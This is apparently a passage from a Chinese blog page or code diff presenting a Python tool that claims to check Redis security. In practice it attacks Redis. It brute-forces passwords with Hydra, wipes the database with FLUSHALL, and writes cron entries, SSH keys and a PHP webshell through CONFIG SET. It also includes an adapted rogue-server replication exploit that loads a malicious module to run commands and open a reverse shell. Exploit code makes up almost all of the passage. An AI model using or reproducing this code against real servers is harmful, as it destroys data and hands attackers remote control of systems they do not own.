function_">test_redis_rce</span>(<span class="hljs-params">rhost, lhost, exp_file, auth</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    测试Redis是否易受RCE攻击。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    command = <span class="hljs-string">f&quot;python3 /home/kali/workfeild/rce.py -r <span class="hljs-subst">&#123;rhost&#125;</span> -L <span class="hljs-subst">&#123;lhost&#125;</span> -f <span class="hljs-subst">&#123;exp_file&#125;</span> -a <span class="hljs-subst">&#123;auth&#125;</span>&quot;</span><br>    process = subprocess.run(command, shell=<span class="hljs-literal">True</span>, capture_output=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Exploit Success!&quot;</span> <span class="hljs-keyword">in</span> process.stdout.decode():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[INFO] Redis RCE 攻击成功： <span class="hljs-subst">&#123;command&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[INFO] Redis RCE攻击失败： <span class="hljs-subst">&#123;command&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_cron_getshell</span>(<span class="hljs-params">host=<span class="hljs-string">&quot;localhost&quot;</span>, port=<span class="hljs-number">6379</span>, password=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    利用 Redis 写入计划任务</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 使用 StrictRedis 连接</span><br>        client = redis.StrictRedis(<br>            host=host, port=port, password=password, decode_responses=<span class="hljs-literal">True</span><br>        )<br><br>        <span class="hljs-comment"># 设置 cron 键</span><br>        result = client.execute_command(<br>            <span class="hljs-string">&quot;FLUSHALL&quot;</span>,<br>        )<br>        result = client.<span class="hljs-built_in">set</span>(<span class="hljs-string">&quot;cron&quot;</span>, <span class="hljs-string">&quot;\n\n* * * * 1  date&quot;</span>)<br><br>        <span class="hljs-comment"># 设置配置文件目录</span><br>        result = client.config_set(<span class="hljs-string">&quot;dir&quot;</span>, <span class="hljs-string">&quot;/var/spool/cron&quot;</span>)<br><br>        <span class="hljs-comment"># 设置数据库文件名</span><br>        result = client.config_set(<span class="hljs-string">&quot;dbfilename&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>)<br><br>        <span class="hljs-comment"># 保存配置</span><br>        result = client.save()<br><br>        <span class="hljs-comment"># 判断命令是否成功执行并输出提示</span><br>        <span class="hljs-keyword">if</span> result == <span class="hljs-literal">True</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] Redis 写入计划任务命令已成功执行！&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] Redis 写入计划任务命令执行失败！&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Redis 配置失败：<span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_sshkeygen</span>(<span class="hljs-params">host=<span class="hljs-string">&quot;localhost&quot;</span>, port=<span class="hljs-number">6379</span>, password=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    利用 Redis 写入ssh-keygen</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 使用 StrictRedis 连接</span><br>        client = redis.StrictRedis(<br>            host=host, port=port, password=password, decode_responses=<span class="hljs-literal">True</span><br>        )<br><br>        <span class="hljs-comment"># 设置 cron 键</span><br>        result = client.execute_command(<br>            <span class="hljs-string">&quot;FLUSHALL&quot;</span>,<br>        )<br>        result = client.<span class="hljs-built_in">set</span>(<span class="hljs-string">&quot;cron&quot;</span>, <span class="hljs-string">&quot;\n\nid_rsa.pub\n\n&quot;</span>)<br><br>        <span class="hljs-comment"># 设置配置文件目录</span><br>        result = client.config_set(<span class="hljs-string">&quot;dir&quot;</span>, <span class="hljs-string">&quot;/root/.ssh&quot;</span>)<br><br>        <span class="hljs-comment"># 设置数据库文件名</span><br>        result = client.config_set(<span class="hljs-string">&quot;dbfilename&quot;</span>, <span class="hljs-string">&quot;test_authorized_keys&quot;</span>)<br><br>        <span class="hljs-comment"># 保存配置</span><br>        result = client.save()<br><br>        <span class="hljs-comment"># 判断命令是否成功执行并输出提示</span><br>        <span class="hljs-keyword">if</span> result == <span class="hljs-literal">True</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] Redis 成功写入ssh公钥！&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] Redis 写入ssh公钥失败！&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Redis 配置失败：<span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_web_getshell</span>(<span class="hljs-params">host=<span class="hljs-string">&quot;localhost&quot;</span>, port=<span class="hljs-number">6379</span>, password=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    利用 Redis 写入网站绝对路径</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 使用 StrictRedis 连接</span><br>        client = redis.StrictRedis(<br>            host=host, port=port, password=password, decode_responses=<span class="hljs-literal">True</span><br>        )<br><br>        <span class="hljs-comment"># 设置 cron 键</span><br>        result = client.execute_command(<br>            <span class="hljs-string">&quot;FLUSHALL&quot;</span>,<br>        )<br>        result = client.<span class="hljs-built_in">set</span>(<span class="hljs-string">&quot;cron&quot;</span>, <span class="hljs-string">&quot;\n\nphp\n\n&quot;</span>)<br><br>        <span class="hljs-comment"># 设置配置文件目录</span><br>        result = client.config_set(<span class="hljs-string">&quot;dir&quot;</span>, <span class="hljs-string">&quot;/var/www/html/&quot;</span>)<br><br>        <span class="hljs-comment"># 设置数据库文件名</span><br>        result = client.config_set(<span class="hljs-string">&quot;dbfilename&quot;</span>, <span class="hljs-string">&quot;shell.php.test&quot;</span>)<br><br>        <span class="hljs-comment"># 保存配置</span><br>        result = client.save()<br><br>        <span class="hljs-comment"># 判断命令是否成功执行并输出提示</span><br>        <span class="hljs-keyword">if</span> result == <span class="hljs-literal">True</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] Redis 网站目录写入php漏洞脚本成功！&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] Redis 网站目录写入php漏洞脚本失败！&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Redis 配置失败：<span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_redis_security</span>(<span class="hljs-params"></span><br><span class="hljs-params">    host=<span class="hljs-string">&quot;localhost&quot;</span>, port=<span class="hljs-number">6379</span>, password=<span class="hljs-literal">None</span>, password_file=<span class="hljs-literal">None</span></span><br><span class="hljs-params"></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    检查Redis服务器的安全性。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 尝试连接到Redis服务器</span><br>    passwordlist = [<span class="hljs-string">&quot;password&quot;</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_redis_connection(host, port, password):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] 无法连接到Redis服务器，尝试使用Hydra进行暴力破解&quot;</span>)<br>        brute_force_redis_password(host, password_file)<br>        passwordlist = extract_passwords(<span class="hljs-string">&quot;/home/kali/workfeild/redis.txt&quot;</span>)<br>        <span class="hljs-keyword">if</span> passwordlist != []:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] Hydra密码爆破成功&quot;</span>)<br>            password = passwordlist[-<span class="hljs-number">1</span>]<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;破解的密码: <span class="hljs-subst">&#123;password&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] Hydra密码爆破失败&quot;</span>)<br>            <span class="hljs-keyword">return</span><br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 检查是否设置了密码</span><br>        <span class="hljs-keyword">if</span> password <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> passwordlist == []:<br>            <span class="hljs-built_in">print</span>(<br>                <span class="hljs-string">&quot;[INFO] 设置了密码，尝试使用Hydra进行暴力破解失败，若需要进一步测试可手动输入密码&quot;</span><br>            )<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">elif</span> password <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[FATAL] 未设置密码&quot;</span>)<br>        <span class="hljs-comment"># 获取Redis信息</span><br>        client = redis.StrictRedis(<br>            host=host, port=port, password=password, decode_responses=<span class="hljs-literal">True</span><br>        )<br>        <span class="hljs-comment"># info = client.info()</span><br>        <span class="hljs-comment"># print(&quot;[INFO] 测试Redis服务器是否响应PING命令&quot;)</span><br>        <span class="hljs-comment"># if client.ping():</span><br>        <span class="hljs-comment">#     print(&quot;[INFO] Redis服务器可以访问且响应PING命令&quot;)</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] 测试Redis服务器是否可以写入ssh公钥&quot;</span>)<br>        <span class="hljs-keyword">if</span> write_sshkeygen(host, port, password):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[FATAL] 通过Redis成功篡改ssh公钥&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[DONE] 无法通过Redis篡改ssh公钥&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] 测试Redis服务器是否可以写入php漏洞脚本getshell&quot;</span>)<br>        <span class="hljs-keyword">if</span> write_web_getshell(host, port, password):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[FATAL] 通过Redis写入php漏洞脚本getshell&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[DONE] 无法通过Redis写入php漏洞脚本getshell&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] 测试Redis服务器是否可以写入cron漏洞脚本&quot;</span>)<br>        <span class="hljs-keyword">if</span> write_cron_getshell(host, port, password):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[FATAL] 通过Redis服务器写入一个计划任务反弹shell&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[DONE] 无法通过Redis服务器写入计划任务反弹shell&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] 测试Redis服务器是否可以利用Redis主从复制GetShell&quot;</span>)<br>        <span class="hljs-keyword">if</span> test_redis_rce(host, lhost, exp_file, password):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[FATAL] 成功利用Redis主从复制GetShell&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[DONE] 无法利用Redis主从复制GetShell&quot;</span>)<br>        <span class="hljs-comment"># print(&quot;[INFO] 测试Redis服务器是否开启protected-mode&quot;)</span><br>        <span class="hljs-comment"># if client.config_get(&quot;protected-mode&quot;)[1] == &quot;yes&quot;:</span><br>        <span class="hljs-comment">#     print(&quot;[DONE] Redis服务器开启protected-mode&quot;)</span><br>        <span class="hljs-comment"># else:</span><br>        <span class="hljs-comment">#     print(&quot;[FATAL] Redis服务器未开启protected-mode&quot;)</span><br><br>        <span class="hljs-comment"># print(&quot;[INFO] 测试Redis服务器是否绑定特定IP地址&quot;)</span><br>        <span class="hljs-comment"># if client.config_get(&quot;bind&quot;)[1] == &quot;&quot;:</span><br>        <span class="hljs-comment">#     print(&quot;[INFO] Redis服务器未绑定特定IP地址&quot;)</span><br>        <span class="hljs-comment"># else:</span><br>        <span class="hljs-comment">#     print(f&quot;[DONE] Redis服务器绑定IP地址：&#123;client.config_get(&#x27;bind&#x27;)[1]&#125;&quot;)</span><br><br>    <span class="hljs-keyword">except</span> redis.exceptions.ResponseError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[ERROR] Redis响应错误: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&quot;检查Redis的安全性&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;--host&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, default=<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Redis服务器地址&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;--port&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>, default=<span class="hljs-number">6379</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Redis服务器端口&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;--password&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Redis服务器密码&quot;</span>)<br><br>    args = parser.parse_args()<br><br>    <span class="hljs-comment"># 进行安全检查</span><br>    check_redis_security(<br>        host=args.host,<br>        port=args.port,<br>        password=args.password,<br>        password_file=password_file,<br>    )<br><br></code></pre></td></tr></table></figure>
+
+<p>rce.py</p>
+<p>基于GitHub开源代码修改<a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># coding:utf-8</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><br>CLRF = <span class="hljs-string">&quot;\r\n&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_cmd_arr</span>(<span class="hljs-params">arr</span>):<br>    cmd = <span class="hljs-string">&quot;&quot;</span><br>    cmd += <span class="hljs-string">&quot;*&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(arr))<br>    <span class="hljs-keyword">for</span> arg <span class="hljs-keyword">in</span> arr:<br>        cmd += CLRF + <span class="hljs-string">&quot;$&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(arg))<br>        cmd += CLRF + arg<br>    cmd += <span class="hljs-string">&quot;\r\n&quot;</span><br>    <span class="hljs-keyword">return</span> cmd<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_cmd</span>(<span class="hljs-params">raw_cmd</span>):<br>    <span class="hljs-keyword">return</span> mk_cmd_arr(raw_cmd.split(<span class="hljs-string">&quot; &quot;</span>))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">din</span>(<span class="hljs-params">sock, cnt</span>):<br>    msg = sock.recv(cnt)<br>    <span class="hljs-keyword">return</span> msg.decode()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dout</span>(<span class="hljs-params">sock, msg</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(msg) != <span class="hljs-built_in">bytes</span>:<br>        msg = msg.encode()<br>    sock.send(msg)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_shell_result</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;\n&quot;</span>.join(s.split(<span class="hljs-string">&quot;\r\n&quot;</span>)[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>])<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Remote</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, rhost, rport</span>):<br>        self._host = rhost<br>        self._port = rport<br>        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        self._sock.connect((self._host, self._port))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, msg</span>):<br>        dout(self._sock, msg)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">recv</span>(<span class="hljs-params">self, cnt=<span class="hljs-number">65535</span></span>):<br>        <span class="hljs-keyword">return</span> din(self._sock, cnt)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">do</span>(<span class="hljs-params">self, cmd</span>):<br>        self.send(mk_cmd(cmd))<br>        buf = self.recv()<br>        <span class="hljs-keyword">return</span> buf<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">close</span>(<span class="hljs-params">self</span>):<br>        self._sock.close()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">shell_cmd</span>(<span class="hljs-params">self, cmd</span>):<br>        self.send(mk_cmd_arr([<span class="hljs-string">&#x27;system.exec&#x27;</span>, <span class="hljs-string">&quot;&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(cmd)]))<br>        buf = self.recv()<br>        <span class="hljs-keyword">return</span> buf<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">reverse_shell</span>(<span class="hljs-params">self, addr, port</span>):<br>        self.send(mk_cmd(<span class="hljs-string">&quot;system.rev &#123;&#125; &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(addr, port)))<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RogueServer</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, lhost, lport, remote, file</span>):<br>        self._host = lhost<br>        self._port = lport<br>        self._remote = remote<br>        self._file = file<br>        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        self._sock.bind((<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, self._port))<br>        self._sock.settimeout(<span class="hljs-number">15</span>)<br>        self._sock.listen(<span class="hljs-number">10</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle</span>(<span class="hljs-params">self, data</span>):<br>        resp = <span class="hljs-string">&quot;&quot;</span><br>        phase = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">if</span> data.find(<span class="hljs-string">&quot;PING&quot;</span>) &gt; -<span class="hljs-number">1</span>:<br>            resp = <span class="hljs-string">&quot;+PONG&quot;</span> + CLRF<br>            phase = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">elif</span> data.find(<span class="hljs-string">&quot;REPLCONF&quot;</span>) &gt; -<span class="hljs-number">1</span>:<br>            resp = <span class="hljs-string">&quot;+OK&quot;</span> + CLRF<br>            phase = <span class="hljs-number">2</span><br>        <span class="hljs-keyword">elif</span> data.find(<span class="hljs-string">&quot;AUTH&quot;</span>) &gt; -<span class="hljs-number">1</span>:<br>            resp = <span class="hljs-string">&quot;+OK&quot;</span> + CLRF<br>            phase = <span class="hljs-number">3</span><br>        <span class="hljs-keyword">elif</span> data.find(<span class="hljs-string">&quot;PSYNC&quot;</span>) &gt; -<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> data.find(<span class="hljs-string">&quot;SYNC&quot;</span>) &gt; -<span class="hljs-number">1</span>:<br>            resp = <span class="hljs-string">&quot;+FULLRESYNC &quot;</span> + <span class="hljs-string">&quot;Z&quot;</span> * <span class="hljs-number">40</span> + <span class="hljs-string">&quot; 0&quot;</span> + CLRF<br>            resp += <span class="hljs-string">&quot;$&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(payload)) + CLRF<br>            resp = resp.encode()<br>            resp += payload + CLRF.encode()<br>            phase = <span class="hljs-number">4</span><br>        <span class="hljs-keyword">return</span> resp, phase<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">close</span>(<span class="hljs-params">self</span>):<br>        self._sock.close()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">try</span>:<br>            cli, addr = self._sock.accept()<br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                data = din(cli, <span class="hljs-number">1024</span>)<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">0</span>:<br>                    <span class="hljs-keyword">break</span><br>                resp, phase = self.handle(data)<br>                dout(cli, resp)<br>                <span class="hljs-keyword">if</span> phase == <span class="hljs-number">4</span>:<br>                    <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cleanup</span>(<span class="hljs-params">remote, expfile</span>):<br>    remote.do(<span class="hljs-string">&quot;CONFIG SET dbfilename dump.rdb&quot;</span>)<br>    remote.shell_cmd(<span class="hljs-string">&quot;rm ./&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(expfile))<br>    remote.do(<span class="hljs-string">&quot;MODULE UNLOAD system&quot;</span>)<br>    remote.close()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit_redis</span>(<span class="hljs-params">rhost, rport, lhost, lport, exp_file, auth=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">global</span> payload<br>    expfile = os.path.basename(exp_file)<br>    payload = <span class="hljs-built_in">open</span>(exp_file, <span class="hljs-string">&quot;rb&quot;</span>).read()<br>    <span class="hljs-keyword">try</span>:<br>        remote = Remote(rhost, rport)<br>        <span class="hljs-keyword">if</span> auth:<br>            check = remote.do(<span class="hljs-string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(auth))<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;invalid password&quot;</span> <span class="hljs-keyword">in</span> check:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            info = remote.do(<span class="hljs-string">&quot;INFO&quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;NOAUTH&quot;</span> <span class="hljs-keyword">in</span> info:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        remote.do(<span class="hljs-string">&quot;SLAVEOF &#123;&#125; &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(lhost, lport))<br>        remote.do(<span class="hljs-string">&quot;CONFIG SET dbfilename &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(expfile))<br>        sleep(<span class="hljs-number">2</span>)<br>        rogue = RogueServer(lhost, lport, remote, expfile)<br>        <span class="hljs-keyword">if</span> rogue.exp():<br>            sleep(<span class="hljs-number">2</span>)<br>            remote.do(<span class="hljs-string">&quot;MODULE LOAD ./&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(expfile))<br>            remote.do(<span class="hljs-string">&quot;SLAVEOF NO ONE&quot;</span>)<br>            rogue.close()<br>            cleanup(remote, expfile)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure>
+
+
+
